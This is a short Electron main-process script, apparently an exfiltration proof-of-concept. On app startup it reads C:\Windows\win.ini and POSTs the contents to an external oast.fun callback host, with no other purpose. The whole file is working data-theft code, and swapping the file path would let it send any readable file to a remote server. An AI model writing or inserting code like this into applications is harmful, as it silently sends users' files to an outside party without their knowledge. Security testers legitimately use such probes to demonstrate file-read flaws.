const { app, BrowserWindow } = require('electron');
const fs = require('fs');
const fetch = require('node-fetch'); // Use node-fetch to make HTTP requests in the main process

app.on('ready', () => {
  const filePath = 'C:\\Windows\\win.ini'; // Define the file path

  fs.readFile(filePath, 'utf-8', (err, data) => {
    if (err) {
      console.error(err);
      // Handle error when file reading fails
    } else {
      // Send file content to the server
      sendDataToServer(data);
    }
  });
});

function sendDataToServer(data) {
  fetch('http://ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun', {
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain', // Change content type as needed
    },
    body: data,
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok.');
    }
    return response.text();
  })
  .then(responseData => {
    console.log('Server response:', responseData);
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
  });
}
